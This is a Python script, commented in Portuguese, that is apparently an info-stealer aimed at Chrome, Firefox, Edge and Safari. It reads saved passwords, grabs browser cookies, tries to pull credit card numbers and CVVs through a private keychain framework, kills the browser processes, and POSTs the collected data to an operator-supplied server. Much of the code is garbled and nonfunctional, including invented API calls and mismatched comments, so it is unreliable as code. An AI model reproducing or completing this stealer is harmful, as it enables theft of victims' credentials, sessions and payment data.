import os
import requests
import hashlib

def get_passwords(file_path):
    passwords = []
    with open(file_path, 'r') as f:
        for line in f.readlines():
            passwords.append(line.strip())
    return passwords

def get_cookies(browser):
    try:
        cookie_string = browser.get_cookies()
        cookies = {}
        for cookie in cookie_string:
            cookies[cookie['name']] = cookie['value']
        return cookies
    except Exception as e:
        print(f'Erro ao obter cookies: {e}')
        return {}

def get_credit_cards(browser):
    credit_cards = []
    try:
        card_data = browser.get_node_modules().objc4.NodeModule._import(
            '/System/Library/PrivateFrameworks/SpringBoardFoundation.framework/SpringBoardFoundation',
            'SBXKeychain',
        ).accessibilityElementForIdentifier_('unlock Keychain')
        card_dic = card_data.cbkeyboard
        for dic in card_data.cbkeyboard:
            card = {}
            card['number'] = dic['ireccion']
            card['expiry'] = dic['mes'] + '/' + dic['ano']
            card['cvv'] = dic['cvc']
            card['name'] = dic['nome']
            card['password'] = dic['password']
            credit_cards.append(card)
        return credit_cards
    except Exception as e:
        print(f'Erro ao obter cartões de crédito: {e}')
        return []

def send_data(data, server_url):
    try:
        response = requests.post(server_url, data=data)
        if response.status_code == 200:
            print('Dados enviados com sucesso!')
        else:
            print('Falha ao enviar dados, código de status:', response.status_code)
    except Exception as e:
        print(f'Erro ao enviar dados: {e}')

def main():
    # Adicione aqui o caminho para o arquivo contendo as senhas salvas (ex: ~/.passwords)
    password_file_path = '/path/to/password_file'

    # Adicione aqui a lista de navegadores a serem explorados
    browsers = [
        'Google Chrome',
        'Mozilla Firefox',
        'Microsoft Edge',
        'Safari',
        # Adicione ou renomeie conforme necessário
    ]

    server_url = 'http://example.com/recv_data'  # Insira a URL do seu servidor aqui

    for browser in browsers:
        print(f'Coletando informações do {browser}')
        os.system(f'killall {browser}')

        # Limpa a cache, histórico e senhas salvas
        os.system(f'{{killall {browser}; killall {browser}}}')

        passwords = get_passwords(password_file_path)
        cookies = get_cookies(browser)
        credit_cards = get_credit_cards(browser)

        data = {
            'browser': browser,
            'passwords': passwords,
            'cookies': cookies,
            'credit_cards': credit_cards,
        }

        for key, value in data.items():
            print(key, ':')
            for val in value:
                print(val)
            print()

        send_data(data, server_url)

if __name__ == '__main__':
    main()
